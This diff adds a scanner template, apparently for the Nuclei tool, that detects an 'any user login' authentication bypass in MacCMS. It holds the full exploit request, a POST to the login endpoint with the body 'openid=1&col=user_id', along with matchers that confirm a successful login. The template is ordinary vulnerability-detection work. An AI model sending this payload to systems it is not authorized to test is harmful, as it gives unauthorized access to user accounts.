@@ -1,0 +1,33 @@
+id: maccms-Any-user-login
+
+info:
+  name: maccms-Any-user-login
+  author: ritikchaddha
+  severity: high
+  reference:
+    - https://mp.weixin.qq.com/s/9mpvppx3F-nTQYoPdY2r3w
+  tags: maccms,Any-user-login
+
+requests:
+  - raw:
+      - |
+        POST /index.php/user/login.html HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        openid=1&col=user_id
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{"code":1,"msg":"登录成功"}'
+
+      - type: word
+        part: header
+        words:
+          - application/json
+
+      - type: status
+        status:
+          - 200
